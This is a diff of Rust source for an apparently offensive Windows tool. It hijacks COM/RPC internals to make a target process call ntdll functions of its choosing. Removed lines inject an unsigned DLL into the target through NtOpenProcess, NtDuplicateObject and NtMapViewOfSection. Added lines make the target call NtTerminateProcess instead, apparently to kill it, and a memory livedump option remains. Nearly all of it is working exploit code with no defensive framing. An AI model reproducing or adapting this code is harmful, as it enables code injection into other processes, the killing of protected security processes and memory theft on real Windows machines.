@@ -49,10 +49,6 @@ use windows::{
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
 struct Args {
-    /// Path of the (unsigned) DLL to inject
-    #[arg(long)]
-    dll: String,
-
     /// Where to write the livedump on disk (must be a full path)
     #[arg(long)]
     dump: String,
@@ -77,7 +73,6 @@ fn main() {
     }
 
     target_pid = args.pid;
-    let dll_to_inject = args.dll;
 
     if rpcss_pid == 0 || target_pid == 0 {
         panic!("Could not find PID for rpcss or target PID is invalid");
@@ -383,72 +378,41 @@ fn main() {
         panic!("[-] rpcrt4.dll .data section is too small. Please use another DLL.");
     }
 
-    let start_address1 = unsafe { GetModuleHandleA(s!("rpcrt4\0")).unwrap().0 as u64 }
-        + rpcrt_data.virtual_address as u64
-        + rpcrt_data.virtual_size as u64;
+    let start_address2 =
+        unsafe { GetModuleHandleA(s!("bcryptprimitives.dll\0")).unwrap().0 as u64 }
+            + bcryptprimitives_data.virtual_address as u64
+            + bcryptprimitives_data.virtual_size as u64;
 
-    let arguments_address = unsafe {
+    let arguments_address2 = unsafe {
         GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
             + kernel32_data.virtual_address as u64
             + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
     };
 
-    let target_function = unsafe {
+    let nt_terminate_process = unsafe {
         GetProcAddress(
             GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
-            s!("NtOpenProcess"),
+            s!("NtTerminateProcess"),
         )
         .unwrap() as u64
     };
 
     let message_addr = write_rpc_message(
-        start_address1,
-        arguments_address,
-        target_function,
+        start_address2,
+        arguments_address2,
+        nt_terminate_process,
         target_ipid,
         target_oxid,
         com_context,
         com_secret,
-    );
-
-    let handle_to_self_rs_address =
-        unsafe { GetModuleHandleA(s!("ntdll.dll\0")).unwrap().0 as u64 }
-            + ntdll_data.virtual_address as u64
-            + ntdll_data.virtual_size as u64;
-
-    let remote_handle_to_section_address = handle_to_self_rs_address + 8;
-
-    let mut obj_attr = OBJECT_ATTRIBUTES::default();
-    obj_attr.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
-    let obj_data: [u8; size_of::<OBJECT_ATTRIBUTES>()] = unsafe { transmute_copy(&obj_attr) };
-
-    write_data_to_address(
-        &obj_data,
-        remote_handle_to_section_address + 8,
-        target_ipid,
-        target_oxid,
-        com_secret,
-        com_context,
-    );
-
-    let mut client_id = CLIENT_ID::default();
-    client_id.UniqueProcess = HANDLE(process::id() as isize);
-    let client_id_data: [u8; size_of::<CLIENT_ID>()] = unsafe { transmute_copy(&client_id) };
-    write_data_to_address(
-        &client_id_data,
-        remote_handle_to_section_address + 8 + size_of::<OBJECT_ATTRIBUTES>() as u64,
-        target_ipid,
-        target_oxid,
-        com_secret,
-        com_context,
     );
 
     set_call_args(
         [
-            handle_to_self_rs_address,
-            PROCESS_ALL_ACCESS.0 as u64,
-            remote_handle_to_section_address + 8,
-            remote_handle_to_section_address + 8 + size_of::<OBJECT_ATTRIBUTES>() as u64,
+            0xFFFFFFFFFFFFFFFF,
+            0xFFFFFFFFFFFFFFFF,
+            0x2,
+            0x3,
             0x4,
             0x5,
             0x6,
@@ -468,189 +432,6 @@ fn main() {
 
     call_ndr_server_call2(
         message_addr,
-        target_ipid,
-        target_oxid,
-        com_secret,
-        com_context,
-    );
-
-    if ((bcryptprimitives_data.virtual_size & 0xFFF) + 0x220) >= 0x1000 {
-        panic!("[-] bcryptprimitives.dll .data section is too small. Please use another DLL.");
-    }
-
-    let start_address2 =
-        unsafe { GetModuleHandleA(s!("bcryptprimitives.dll\0")).unwrap().0 as u64 }
-            + bcryptprimitives_data.virtual_address as u64
-            + bcryptprimitives_data.virtual_size as u64;
-
-    let arguments_address2 = unsafe {
-        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
-            + kernel32_data.virtual_address as u64
-            + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
-    };
-
-    let target_function2 = unsafe {
-        GetProcAddress(
-            GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
-            s!("NtDuplicateObject"),
-        )
-        .unwrap() as u64
-    };
-
-    let message_addr2 = write_rpc_message(
-        start_address2,
-        arguments_address2,
-        target_function2,
-        target_ipid,
-        target_oxid,
-        com_context,
-        com_secret,
-    );
-
-    let handle_to_rs = increment_and_read(
-        handle_to_self_rs_address,
-        target_ipid,
-        target_oxid,
-        com_secret,
-        com_context,
-    ) - 1;
-
-    println!("[+] Remote HANDLE to our process : {:#X}", handle_to_rs);
-
-    let dll_handle = unsafe {
-        CreateFileA(
-            PCSTR(format!("{}\0", dll_to_inject).as_ptr()),
-            GENERIC_READ.0,
-            FILE_SHARE_READ,
-            None,
-            OPEN_EXISTING,
-            FILE_ATTRIBUTE_NORMAL,
-            None,
-        )
-    };
-
-    if dll_handle.is_err() {
-        panic!();
-    }
-
-    let mut section_handle = HANDLE::default();
-    let status = unsafe {
-        NtCreateSection(
-            &mut section_handle,
-            SECTION_ALL_ACCESS.0,
-            None,
-            None,
-            PAGE_READONLY,
-            SEC_IMAGE.0,
-            dll_handle.unwrap(),
-        )
-    };
-
-    if status.is_err() {
-        panic!();
-    }
-
-    set_call_args(
-        [
-            handle_to_rs,
-            section_handle.0 as u64,
-            u64::MAX, //
-            remote_handle_to_section_address,
-            GENERIC_ALL.0 as u64,
-            0,
-            0x0,
-            0x7,
-            0x8,
-            0x9,
-            0xA,
-            0xB,
-            0xC,
-            0xD,
-        ],
-        target_ipid,
-        target_oxid,
-        com_secret,
-        com_context,
-    );
-
-    call_ndr_server_call2(
-        message_addr2,
-        target_ipid,
-        target_oxid,
-        com_secret,
-        com_context,
-    );
-
-    let remote_handle_to_section = increment_and_read(
-        remote_handle_to_section_address,
-        target_ipid,
-        target_oxid,
-        com_secret,
-        com_context,
-    ) - 1;
-
-    println!(
-        "[+] Remote HANDLE to our section : {:#X}",
-        remote_handle_to_section
-    );
-
-    if ((win32u_data.virtual_size & 0xFFF) + 0x220) >= 0x1000 {
-        panic!("[-] win32u.dll .data section is too small. Please use another DLL.");
-    }
-
-    let start_address3 = unsafe { GetModuleHandleA(s!("win32u.dll\0")).unwrap().0 as u64 }
-        + win32u_data.virtual_address as u64
-        + win32u_data.virtual_size as u64;
-
-    let arguments_address3 = unsafe {
-        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
-            + kernel32_data.virtual_address as u64
-            + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
-    };
-
-    let target_function3 = unsafe {
-        GetProcAddress(
-            GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
-            s!("NtMapViewOfSection"),
-        )
-        .unwrap() as u64
-    };
-
-    let message_addr3 = write_rpc_message(
-        start_address3,
-        arguments_address3,
-        target_function3,
-        target_ipid,
-        target_oxid,
-        com_context,
-        com_secret,
-    );
-
-    set_call_args(
-        [
-            remote_handle_to_section,       // SECTION HANDLE
-            u64::MAX,                       // PROCESS HANDLE
-            arguments_address3 + 0x200,     // PVOID* BaseAddres - FIXME
-            4,                              // ZeroBits
-            0,                              // ComitSize
-            0,                              // optionnal SectionOffset
-            arguments_address3 + 0x200 + 8, // ViewSize
-            ViewShare.0 as u64,             // InheritDisposition
-            0x0,                            // AllocationType
-            0x2,                            // Win32Protect
-            0xA,
-            0xB,
-            0xC,
-            0xD,
-        ],
-        target_ipid,
-        target_oxid,
-        com_secret,
-        com_context,
-    );
-
-    call_ndr_server_call2(
-        message_addr3,
         target_ipid,
         target_oxid,
         com_secret,
